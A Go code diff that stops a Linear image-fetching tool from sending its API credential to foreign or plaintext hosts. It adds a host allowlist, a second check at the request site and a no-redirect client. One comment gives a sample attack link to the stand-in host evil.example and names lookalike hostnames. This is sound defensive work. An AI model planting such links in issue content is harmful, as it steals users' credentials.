@@ -6,6 +6,7 @@ import (
 	"io"
 	"mime"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -41,16 +42,41 @@ type imageRef struct {
 	target string
 }
 
-// findImages returns the remote image links in a body.
+// allowedImageURL reports whether a markdown image target is one fleet may
+// fetch: https, and hosted on Linear's own upload host.
 //
-// Only http(s) targets are collected. Linear's own markdown carries absolute
-// uploads.linear.app URLs, and anything else — a relative path, a data URI —
-// is not something fleet has any business fetching.
+// This gate is the whole defence, and it is narrow on purpose. fetchImage
+// attaches the live Linear credential — a raw personal API key, or an OAuth
+// access token — to whatever URL it is handed. Issue descriptions and comments
+// are attacker-influenced content: anyone who can write to an issue fleet later
+// materializes (including through Linear's customer requests and public intake)
+// could add `![x](http://evil.example/)` and be sent the credential directly.
+//
+// http is refused as well as foreign hosts, so the credential can never cross
+// the network in plaintext even to Linear itself.
+//
+// The host comparison is on url.Host, never a string prefix or suffix: a
+// suffix test matches evil-uploads.linear.app.evil.example, and a prefix test
+// matches uploads.linear.app.evil.example. Port is stripped so an explicit
+// :443 still matches.
+func allowedImageURL(target string) bool {
+	u, err := url.Parse(target)
+	if err != nil {
+		return false
+	}
+	return u.Scheme == "https" && u.Hostname() == uploadsHost
+}
+
+// findImages returns the remote image links in a body that fleet may fetch.
+//
+// Anything else — a relative path, a data URI, plain http, or a host that is
+// not Linear's — is dropped here rather than downstream, so a body full of
+// hostile links costs nothing and reaches no network stack at all.
 func findImages(markdown []byte) []imageRef {
 	var refs []imageRef
 	for _, m := range imageLinkRe.FindAllSubmatch(markdown, -1) {
 		target := string(m[2])
-		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
+		if !allowedImageURL(target) {
 			continue
 		}
 		refs = append(refs, imageRef{alt: string(m[1]), target: target})
@@ -93,6 +119,14 @@ func detectExt(name string, body []byte) (string, bool) {
 // an agent handed the raw markdown could not open a single screenshot. The
 // credential is read per request and never written anywhere.
 func fetchImage(ctx context.Context, url, destDir, alt string, index int) (string, int64, error) {
+	// Re-checked here even though findImages already filtered, because this is
+	// the line that attaches the credential. A gate one call away from the
+	// thing it protects is a gate that a later refactor removes without
+	// noticing; this one cannot be separated from the header it guards.
+	if !allowedImageURL(url) {
+		return "", 0, fmt.Errorf("refusing to send credentials to %q", url)
+	}
+
 	cred, err := credential()
 	if err != nil {
 		return "", 0, err
@@ -107,7 +141,18 @@ func fetchImage(ctx context.Context, url, destDir, alt string, index int) (strin
 	}
 	req.Header.Set("Authorization", cred.authHeader())
 
-	resp, err := httpClient.Do(req)
+	// Do NOT reuse the shared httpClient here. Two independent reasons, and
+	// each one alone would be enough:
+	//
+	// A redirect is a second URL that no gate has seen. Go strips Authorization
+	// across a redirect only when the host changes *domain* — it deliberately
+	// permits uploads.linear.app -> anything.linear.app, and a subdomain
+	// takeover there would be handed the credential. Refusing every redirect
+	// costs nothing: Linear serves these bytes directly.
+	//
+	// And the shared client carries a 90s timeout meant for GraphQL, while this
+	// path already has its own imageFetchTimeout on the context.
+	resp, err := imageClient.Do(req)
 	if err != nil {
 		return "", 0, err
 	}
